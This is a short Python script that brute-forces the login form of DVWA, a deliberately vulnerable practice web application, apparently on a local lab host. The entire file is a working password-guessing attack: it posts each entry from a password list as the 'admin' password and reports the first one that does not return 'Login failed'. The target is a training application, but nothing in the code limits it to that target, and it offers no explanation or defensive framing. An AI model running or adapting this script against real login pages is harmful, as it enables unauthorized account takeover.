import requests
import re
from termcolor import colored


#target_url
target_url = "http://192.168.1.108/dvwa/login.php"
data = {"username":"admin","password":"","Login":"submit"}
count = 0
#password list -> password.txt
with open("passwords.txt","r") as passwords:
    for word in passwords:
        password = word.strip()
        data["password"] = password
        response = requests.post(target_url,data)
        fail_message="Login failed"
        if fail_message not in response.text:
            print("\n\n[+] Got the password:- "+colored(password,'green')+"\n\n" )
            break
        count += 1
        print("\rNumber of password tried:- " + str(count),end="")